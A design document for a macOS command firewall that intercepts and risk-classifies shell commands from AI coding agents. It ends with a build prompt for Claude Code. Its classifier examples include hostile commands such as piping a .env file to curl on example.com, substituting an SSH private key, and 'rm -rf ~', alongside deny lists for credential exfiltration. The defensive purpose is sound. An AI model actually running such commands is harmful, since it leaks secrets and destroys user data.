# Local Agent Gate Design Doc

Last updated: 2026-07-26

## Summary

Local Agent Gate is a local-first command approval and audit layer for AI coding agents and other high-risk developer commands. The first product should be a macOS menu bar app and local daemon that can intercept tool/command approval requests from local agents, classify risk, apply user policy, and ask for approval on trusted local devices.

The key product stance is:

> A local command firewall for AI agents. Your Mac stays the authority. Your phone and watch are approval surfaces. No hosted relay, no required account, no source upload.

The Apple Watch experience is valuable, but it should not be the entire product. The Mac tool must stand alone as a useful security layer. iPhone and watchOS companions make it faster and more delightful to approve or deny work when the user steps away.

## Problem

AI coding agents increasingly need permission to run shell commands, edit files, install dependencies, deploy services, publish packages, run migrations, and access sensitive paths. Existing agent approval prompts are fragmented by agent, stuck on the machine where the agent is running, and often lack consistent risk classification or durable audit records.

Developers want to keep agents moving without blindly enabling auto-approve. They also want to step away from the Mac while preserving oversight.

## Market Context

There are adjacent products, but the exact local-first Apple-native command firewall position still has room.

Closest adjacent products:

- Agent Approve: iPhone and Apple Watch approval for many agents, but uses its cloud relay as a core part of the product.
- Vigili: local same-network approvals for Claude Code, but uses cloud relay away from home and appears narrower around Claude.
- Claude Watcher: no hosted server and phone approvals over user-owned network paths, but appears more session keepalive/receipt oriented and not watchOS-first.
- Tactic Remote: iOS/macOS remote control for Claude Code and Codex with local network or Cloudflare Tunnel, but the center of gravity is remote control rather than security firewall.
- Apple Watch Mac approval: Apple already supports approving some macOS system prompts with Apple Watch, but not AI-agent command approvals.

This product should not compete as "Claude from your watch." It should compete as "Little Snitch for AI agents and dangerous dev commands."

## Goals

- Intercept approval requests from local AI coding agents.
- Classify commands and tool calls by risk before asking the user.
- Let the user approve or deny requests from Mac, iPhone, and Apple Watch.
- Keep the Mac as the source of truth and policy authority.
- Avoid hosted relay infrastructure in the core product.
- Support user-owned remote connectivity such as Tailscale, WireGuard, SSH tunnel, or manual URL.
- Store useful local audit receipts for unattended runs.
- Support multiple agents through adapters.
- Support generic shell commands, not only AI-agent-specific hooks.

## Non-Goals

- Do not build a general cloud dashboard in the first version.
- Do not require user accounts.
- Do not upload repository source files.
- Do not stream the full terminal by default.
- Do not become a replacement terminal or full remote IDE.
- Do not depend on App Store distribution for the first useful version.
- Do not auto-approve high-risk commands by default.

## Product Shape

### Mac App

The Mac app is the product center.

Responsibilities:

- Menu bar status and controls.
- Local daemon lifecycle.
- Pairing with companion devices.
- Agent adapter installation and health checks.
- Policy management.
- Approval queue.
- Audit log and run receipts.
- Local notification delivery.
- Local web approval UI for early mobile support.

Distribution:

- Direct `.dmg` download.
- Signed and notarized with Apple Developer ID.
- No Mac App Store dependency for MVP.

### Local Daemon

The daemon receives approval requests from adapters, applies policy, and blocks or releases the calling process.

Responsibilities:

- Listen on a Unix domain socket for local adapters.
- Optionally expose a local HTTP/WebSocket API on `127.0.0.1`.
- Optionally expose an authenticated LAN API for paired devices.
- Parse command/tool payloads.
- Run risk classification.
- Apply allow/deny policy.
- Create approval requests.
- Wait for signed decision when required.
- Return allow/deny result to the adapter.
- Persist audit events locally.

Implementation options:

- Swift daemon using Network.framework and SQLite/Core Data.
- Rust daemon packaged inside the Mac app for stronger CLI/process ergonomics.
- Go daemon if fast iteration matters more than Apple-native integration.

Recommendation: SwiftUI Mac app plus a Rust daemon. Swift is best for menu bar, notifications, pairing UI, and eventual companion app code. Rust is best for shell parsing, CLI wrappers, adapters, local sockets, and deterministic policy evaluation.

### iPhone App

The iPhone app is the rich mobile companion.

Responsibilities:

- Pair with the Mac using QR code or local discovery.
- Show pending approvals with richer detail than watchOS.
- Allow approve once, deny, always allow similar, and block similar.
- Manage policy rules.
- Show audit receipts.
- Configure remote connection path for Tailscale/WireGuard/manual URL.

Distribution:

- App Store or TestFlight when ready.
- Not required for the initial Mac-local MVP if a mobile web UI exists.

### watchOS App

The watchOS app is a fast approval surface, not the policy editor.

Responsibilities:

- Show urgent approval requests.
- Display minimal but sufficient context.
- Allow simple low/medium-risk decisions.
- Escalate high-risk decisions to iPhone or Mac.
- Show agent/session status.

Watch approval UI fields:

- Agent name.
- Project/repo.
- Working directory basename.
- Command or tool name.
- Risk level.
- One-sentence risk reason.
- Actions: Allow, Deny.
- Optional secondary actions: Allow similar, Block similar.

High-risk examples should require iPhone or Mac confirmation:

- `git push --force`
- `rm -rf`
- `terraform apply`
- `kubectl delete`
- package publishing
- production deploys
- secret or credential file access

## MVP Strategy

Build the local Mac product first. Validate that users want a command firewall before investing in watchOS polish and App Store review.

### MVP 0: Local CLI Prototype

Goal: prove the approval pipeline works without UI complexity.

Features:

- `agent-gate daemon`
- `agent-gate approve --json`
- `agent-gate run -- <command>`
- Unix socket request/response flow.
- Basic risk classifier.
- Terminal-based approval prompt.
- Local SQLite audit log.

Example:

```bash
agent-gate run -- npm publish
```

Expected behavior:

1. Wrapper sends command metadata to daemon.
2. Daemon classifies `npm publish` as high risk.
3. Daemon requests approval.
4. User approves or denies locally.
5. Wrapper executes or blocks.
6. Event is stored.

### MVP 1: Mac Menu Bar App

Goal: make the local tool useful day to day.

Features:

- Menu bar app with daemon status.
- Pending approvals popover.
- Approve/deny from Mac.
- Install/uninstall adapters.
- Local notifications.
- Audit log view.
- Basic policy editor.

Adapters:

- Generic shell wrapper.
- Claude Code hook adapter.
- Codex CLI adapter, if the local approval integration point is available.

### MVP 2: Mobile Web Approval

Goal: validate phone approval without App Store friction.

Features:

- Local LAN approval page served by the Mac.
- Pairing token/QR code.
- Authenticated WebSocket updates.
- Tailscale/manual URL support.
- Responsive approval UI for iPhone.

This version can be distributed entirely as a Mac tool.

### MVP 3: Native iPhone App

Goal: improve reliability and UX after demand is proven.

Features:

- Native pairing.
- Push-style local updates while reachable.
- Better notification support.
- Policy management.
- Run receipts.

### MVP 4: watchOS App

Goal: make wrist approvals a premium, high-delight surface.

Features:

- Watch app paired through iPhone.
- Approval notifications.
- Fast allow/deny.
- Complication or Smart Stack status.
- Haptic severity patterns.

## Architecture

```text
AI agent / shell command
        |
        v
Agent adapter or CLI wrapper
        |
        v
Local Unix socket
        |
        v
Local Agent Gate daemon
        |
        +--> Policy engine
        +--> Risk classifier
        +--> Audit store
        +--> Approval queue
                 |
                 +--> Mac menu bar UI
                 +--> Local web UI
                 +--> iPhone app
                 +--> watchOS app
```

## Data Model

### ApprovalRequest

```json
{
  "id": "req_01J...",
  "createdAt": "2026-07-26T16:15:00Z",
  "expiresAt": "2026-07-26T16:20:00Z",
  "agent": {
    "id": "claude-code",
    "name": "Claude Code",
    "sessionId": "optional-session-id"
  },
  "project": {
    "path": "/Users/example/project",
    "name": "project",
    "gitRemote": "git@github.com:org/project.git",
    "gitBranch": "main"
  },
  "action": {
    "kind": "shell_command",
    "command": "npm publish",
    "argv": ["npm", "publish"],
    "workingDirectory": "/Users/example/project",
    "environmentSummary": {
      "network": true,
      "writesFiles": false,
      "touchesSecrets": false
    }
  },
  "risk": {
    "level": "high",
    "reasons": ["Publishes a package to a registry"],
    "matchedRules": ["publish-package"]
  },
  "policy": {
    "decision": "ask",
    "matchedRuleIds": []
  }
}
```

### ApprovalDecision

```json
{
  "requestId": "req_01J...",
  "decision": "allow_once",
  "decidedAt": "2026-07-26T16:15:18Z",
  "decidedBy": {
    "deviceId": "device_iphone_01",
    "deviceName": "Personal iPhone",
    "surface": "iphone"
  },
  "signature": "base64-signature"
}
```

Decision values:

- `allow_once`
- `deny_once`
- `allow_similar`
- `block_similar`
- `expired`
- `auto_allowed`
- `auto_blocked`

### AuditEvent

```json
{
  "id": "evt_01J...",
  "requestId": "req_01J...",
  "timestamp": "2026-07-26T16:15:18Z",
  "agentId": "claude-code",
  "projectPath": "/Users/example/project",
  "command": "npm publish",
  "riskLevel": "high",
  "decision": "allow_once",
  "reason": "Approved from iPhone",
  "durationMs": 18000
}
```

## Policy Model

Policies should be layered from broad to specific.

Order of precedence:

1. Built-in catastrophic deny rules.
2. User global deny rules.
3. Repo policy deny rules.
4. User global allow rules.
5. Repo policy allow rules.
6. Risk-based ask defaults.

Deny should win over allow when rules conflict.

Policy locations:

- Global user policy: app-managed local store.
- Project policy: `.agent-gate.yml`.
- Optional team policy later: signed policy bundle.

Example `.agent-gate.yml`:

```yaml
version: 1
defaults:
  lowRisk: allow
  mediumRisk: ask
  highRisk: ask
rules:
  - id: block-force-push-main
    match:
      commandContains: "git push --force"
      branch: "main"
    decision: deny
  - id: ask-package-publish
    match:
      commandStartsWith: "npm publish"
    decision: ask
  - id: allow-tests
    match:
      commandRegex: "^(npm|pnpm|yarn) (test|lint|typecheck)"
    decision: allow
```

## Risk Classification

Risk classifier V1 can be rule-based. Avoid using an LLM for core safety decisions in the first version.

### Low Risk

Usually auto-allow if policy permits:

- `ls`
- `pwd`
- `cat` on non-secret files
- `git status`
- `git diff`
- `npm test`
- `npm run lint`
- `npm run typecheck`

### Medium Risk

Usually ask:

- package install commands
- local file writes
- database migrations in local environment
- branch creation/deletion outside protected branches
- Docker compose operations
- commands that touch generated files broadly

### High Risk

Always ask or escalate:

- `rm -rf`
- `git reset --hard`
- `git clean -fd`
- `git push --force`
- `npm publish`
- `gh release create`
- `twine upload`
- `terraform apply`
- `kubectl delete`
- `aws iam`
- commands reading `.env`, SSH keys, keychains, tokens, or credential stores
- commands sending files to unknown network destinations

### Blocked

Never offer remote approval by default:

- destructive command against root or home directory
- forced push to protected branches
- credential exfiltration patterns
- mass deletion without explicit allow policy
- privilege escalation with suspicious network transfer

## Shell Parsing

Do not rely only on substring checks.

Use a shell-aware parser where possible:

- Parse executable and arguments.
- Detect chained commands.
- Detect redirection.
- Detect command substitution.
- Detect pipes to network tools.
- Detect glob expansion risk.
- Detect `sudo`.

For MVP, treat complex shell syntax as higher risk rather than trying to fully understand it.

Examples:

- `rm -rf ./dist` may be medium risk.
- `rm -rf ~` is blocked.
- `cat .env | curl -X POST https://example.com` is blocked.
- `git status && npm test` is low/medium depending on parser confidence.
- `$(cat ~/.ssh/id_rsa)` anywhere in a command is blocked.

## Agent Adapters

Adapters translate agent-specific approval events into the common `ApprovalRequest` schema.

### Generic Shell Wrapper

Command:

```bash
agent-gate run -- <command>
```

Use cases:

- `agent-gate run -- npm publish`
- `agent-gate run -- terraform apply`
- `agent-gate run -- kubectl delete deployment api`

### Claude Code Adapter

Use Claude Code hooks or available approval integration points to intercept tool use. The adapter should not copy or depend on third-party products. It should map Claude tool requests into the common schema.

Expected payload fields:

- tool name
- command
- cwd
- project path
- session id if available

### Codex CLI Adapter

Codex has its own approval concepts and sandbox/permission flow. The adapter should integrate through supported configuration or wrapper points, not by patching Codex internals.

Expected payload fields:

- command
- sandbox level if available
- approval reason if available
- cwd
- project path

### Gemini CLI Adapter

Start with wrapper mode unless Gemini exposes a stable hook surface.

### Cursor / VS Code Adapter

Later phase. Likely implemented as an extension bridge that forwards tool requests to the local daemon.

## Pairing And Trust

Pairing should establish device trust without an account.

Recommended flow:

1. User opens Mac app pairing screen.
2. Mac displays QR code with local address, pairing token, and daemon public key.
3. iPhone scans QR code.
4. iPhone generates device keypair.
5. Mac and iPhone complete mutual key exchange.
6. Mac stores device public key.
7. iPhone stores Mac public key and connection profile.
8. Future decisions are signed by the device private key.

Security properties:

- A LAN attacker cannot approve without the paired device key.
- Replay attacks should fail because every request has an id, expiry, and nonce.
- Lost devices can be revoked from the Mac app.
- High-risk approvals can require biometric confirmation on iPhone.

## Networking

Preferred paths:

1. Same Mac: Unix domain socket and localhost.
2. Same LAN: Bonjour discovery plus TLS over Network.framework or WebSocket.
3. User-owned remote: Tailscale/WireGuard/manual URL.
4. Optional iCloud only for non-sensitive metadata later.

No product-hosted relay in the default product.

Important distinction:

- "No cloud relay" does not mean "no network."
- The product can support user-owned networks and tunnels.
- It should not operate a hosted approval relay as a dependency.

## App Store Strategy

Mac:

- Ship direct first.
- Sign and notarize.
- Avoid Mac App Store restrictions for daemon, hooks, CLI wrappers, local sockets, and developer workflows.

iPhone/watchOS:

- Native companion apps require App Store/TestFlight for normal public distribution.
- Do not make native iOS/watchOS required for MVP.
- Use local mobile web approval first.
- Build native iPhone/watchOS only after the Mac product shows demand.

Recommended sequence:

1. Direct Mac distribution.
2. Local mobile web UI.
3. TestFlight iPhone companion.
4. App Store iPhone/watchOS companion.

## Privacy And Security Promises

Clear product promises:

- Source code never leaves the Mac through a product-hosted service.
- Approval prompts stay local unless the user configures their own remote network.
- Audit logs are stored locally by default.
- The Mac is the authority for policy and command release.
- Devices can approve only if paired and trusted.
- Dangerous commands can be blocked before they reach the watch.

Avoid overpromising:

- If using iCloud later, say exactly what syncs.
- If using APNs later, say whether payload content is included.
- If using Tailscale, clarify that users configure their own network path.

## UX Requirements

### Mac Menu Bar

States:

- Protected
- Waiting for approval
- Agent running
- Adapter disconnected
- Daemon stopped

Core screens:

- Pending approvals
- Recent events
- Policies
- Devices
- Adapter setup
- Settings

### Approval Card

Fields:

- Agent
- Project
- Command/tool
- Risk label
- Risk reason
- Working directory
- Matched policy/rule
- Timeout

Actions:

- Allow once
- Deny
- Always allow similar
- Block similar
- Open full details

### Audit Receipt

Receipt fields:

- Run/session id
- Start/end time
- Agent
- Project
- Commands requested
- Decisions made
- Files touched if available
- Risk notes
- Blocked actions

## Implementation Milestones

### Milestone 1: CLI And Daemon

- Create Rust workspace or standalone crate.
- Implement Unix socket server.
- Implement `agent-gate run -- <command>`.
- Implement JSON request/decision schema.
- Implement basic shell parser/risk classifier.
- Implement terminal approval.
- Persist events to SQLite.

Exit criteria:

- User can wrap `npm publish`.
- High-risk command asks before executing.
- Denied command does not execute.
- Audit event is stored.

### Milestone 2: Mac App

- Create SwiftUI menu bar app.
- Bundle and manage daemon.
- Show daemon status.
- Show pending approvals.
- Approve/deny from Mac UI.
- Show audit log.
- Sign/notarization setup.

Exit criteria:

- User can install app, start daemon, approve from menu bar.

### Milestone 3: Agent Adapters

- Claude Code adapter.
- Codex CLI adapter.
- Adapter install/uninstall UI.
- Health checks.

Exit criteria:

- At least two AI agents can route approval requests through the same queue.

### Milestone 4: Local Mobile Web

- LAN server with pairing token.
- Responsive approval UI.
- WebSocket pending request updates.
- Device trust and signed decisions.
- Tailscale/manual URL support.

Exit criteria:

- User can approve from iPhone browser over local network or Tailscale.

### Milestone 5: Native Companion

- iPhone app with pairing.
- Native notifications while reachable.
- Policy browsing.
- Watch app with approval actions.

Exit criteria:

- User can approve low/medium-risk requests from Apple Watch.
- High-risk requests escalate to iPhone/Mac.

## Repository Structure Proposal

If building as a new repo:

```text
local-agent-gate/
  apps/
    mac/
      LocalAgentGate.xcodeproj
    ios/
      LocalAgentGateCompanion.xcodeproj
  crates/
    agent-gate-cli/
    agent-gate-daemon/
    agent-gate-policy/
    agent-gate-adapters/
  docs/
    local-agent-gate-design.md
    protocol.md
    threat-model.md
  examples/
    agent-gate.yml
  scripts/
    install-adapters.sh
```

If prototyping inside an existing web/Node repo, keep it isolated:

```text
tools/local-agent-gate/
  package.json
  src/
  docs/
```

## Resolved Design Decisions (For AI Implementation)

To remove ambiguity during implementation, the following decisions have been locked in:
- **First Adapter:** Generic shell wrapper (`agent-gate run -- <command>`). It is the most universal and easiest to test.
- **Daemon Stack:** Rust from day one. It aligns with the long-term macOS integration goals and Rust is excellent for CLI/Daemons.
- **Socket Protocol:** Use HTTP over Unix Domain Sockets. This makes testing with `curl` easy and avoids writing custom framing protocols like NDJSON.
- **Policy File:** Named `.agent-gate.yml`.
- **Target Audience:** Solo developers running agents locally.

## Recommended First Build Prompt For Claude Code

Use this prompt to start implementation:

```text
Build MVP 0 of Local Agent Gate from docs/local-agent-gate-design.md.

Scope:
- Create a CLI prototype only.
- Implement a local daemon and a command wrapper.
- Use a Unix domain socket for local communication.
- Add a rule-based risk classifier.
- Ask for terminal approval before high-risk commands execute.
- Persist audit events locally.
- Do not build Mac, iPhone, watchOS, or web UI yet.

Commands needed:
- agent-gate daemon
- agent-gate run -- <command>
- agent-gate audit

Tech Stack Constraints:
- Language: Rust
- CLI parsing: `clap`
- Async runtime: `tokio`
- Socket communication: HTTP over Unix Domain Socket (use `axum` or `hyper`)
- Serialization: `serde` and `serde_json`
- Database (Audit log): `rusqlite`

Risk behavior:
- Auto-allow low-risk read-only commands.
- Ask for medium/high-risk commands.
- Block catastrophic commands such as rm -rf ~, credential exfiltration patterns, and force-push to main.

Keep implementation small and testable.
Add tests for risk classification and command allow/deny behavior.
```

